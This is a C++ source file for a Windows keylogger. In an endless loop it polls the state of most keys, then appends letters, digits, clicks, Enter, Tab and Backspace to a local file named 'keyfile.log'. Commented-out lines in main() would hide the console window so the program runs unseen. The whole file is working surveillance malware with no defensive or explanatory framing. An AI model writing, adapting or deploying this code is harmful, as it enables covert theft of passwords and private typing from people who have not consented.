//#define _WIN32_WINNT 0x0500
#include <Windows.h>//FOR SLEEP SPECIAL KEYS AND GETASYNKEYSTATE
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream> // FOR COUT CIN
#include <fstream> //FOR WRITE IN A FILE

using namespace std;

void writeSpecialLog(string keyInput)
{
    ofstream keyloggerSaveFile;
    keyloggerSaveFile.open("keyfile.log", ofstream::app);

    if (keyloggerSaveFile.is_open())
    {
        keyloggerSaveFile << keyInput;
        keyloggerSaveFile.close();
    }//NO NEED A ELSE STATMENT BECAUSE THE FILE  WILL BE CREATE IN ANY CASE
}


bool specialKeys(int sKey)
{
    switch (sKey)

    {
    /*IF U WANT MORE
    https://msdn.microsoft.com/en-us/library/ms927178.aspx
    */
    case VK_LBUTTON:
        cout << "#LEFTCLICK#" << endl;
        writeSpecialLog("#LEFTCLICK#");
        return true;
        break;

    case VK_RBUTTON	:
        cout << "#RIGHTCLICK#" << endl;
        writeSpecialLog("#RIGHTCLICK#");
        return true;
        break;

    case VK_CAPITAL:
        cout << "CAPITAL" << endl;
        //writeSpecialLog("");
        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
        return true;
        break;

    case VK_SHIFT:
        cout << "SHIFT" << endl;
        //writeSpecialLog("");
        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
        return true;
        break;

    case VK_CONTROL:
        //cout << "SHIFT" << endl;
        //writeSpecialLog("");
        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
        return true;
        break;

    case VK_MENU:
        //cout << "SHIFT" << endl;
        //writeSpecialLog("");
        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
        return true;
        break;

    case VK_END:
        cout << "END" << endl;
        //writeSpecialLog("");
        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
        return true;
        break;

    case VK_LWIN:
        cout << "lEFTWINDOWS" << endl;
        //writeSpecialLog("");
        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
        return true;
        break;

    case VK_DELETE:
        cout << "DEL" << endl;
        //writeSpecialLog("#<Del>#");
        return true;
        break;

    case VK_RETURN:
        cout << "\n" << endl;
        writeSpecialLog("\n");
        return true;
        break;

    case VK_TAB:
        cout << "TAB" << endl;
        writeSpecialLog("\t");
        return true;
        break;

    case VK_BACK:
            cout << "#back#" << endl;
            writeSpecialLog("#BACK#");
            return true;
            break;

    default:
        return false;
    }
}



int main()
{
    //FreeConsole();
    //ShowWindow(GetConsoleWindow(), SW_HIDE);//Hide windows

    while (true)
    {
        Sleep(10);//INFINITE SLEEP FOR ACTIVE WINDOWS
        for (int key = 8; key <= 255; key++)//PUT 127 IF U WANT MINIMAL KEY
            //WE START AT BACKSPACE WHO IS 8 IN THE ASCII CODE
        {
            if (GetAsyncKeyState(key) == -32767)//IF A TOUCH IS PRESS
            {
                //IF WE DONT HAVE A SPECIFIC KEYS WE PRINT THE AUTHER KEY
                if (specialKeys(key) == false)
                {
                    ofstream keyloggerSaveFile;
                    keyloggerSaveFile.open("keyfile.log", ofstream::app);

                    if (keyloggerSaveFile.is_open())
                    {
                        //ALL THOS IS MAD WITH MY OWN KEYBOARD DON'T KNOW  IF THIS WILL WORK ON OTHER KEYBOARD
                        if((key>64)&&(key<91)&&!(GetKeyState(VK_CAPITAL)))
                            //GetKeyState(VK_CAPITAL) MEAN IF THE LOCK KEY IS ACTIVE
                        {
                            key+=32;
                            keyloggerSaveFile << char(key);//CHAR(27) FOR EXEMPLE IS ESCAPE
                            //cout << char(key) << endl;
                            keyloggerSaveFile.close();
                        }
                        else if ((key>95)&&(key<104)&&(GetKeyState(VK_NUMLOCK)))
                        {
                            key-=48;//ON THE ASCII TABLE THE DIFFERENCE IS 47
                            keyloggerSaveFile << char(key);
                            keyloggerSaveFile.close();

                        }
                        /*
                        else if ((key>95)&&(key<104)&&!(GetKeyState(VK_NUMLOCK)))
                        {
                            key-=48;//ON THE ASCII TABLE THE DIFFERENCE IS 47
                            keyloggerSaveFile << char(key);
                            keyloggerSaveFile.close();

                        }
                        */
                        else if (key == 222)
                        {
                            keyloggerSaveFile << '²';
                            keyloggerSaveFile.close();
                        }
                        //else
                        //{
                        //keyloggerSaveFile << char(key);
                        //cout << key << endl;
                        //keyloggerSaveFile.close();

                        //}
                    }
                }
            }
        }
    }

    return 0;
}
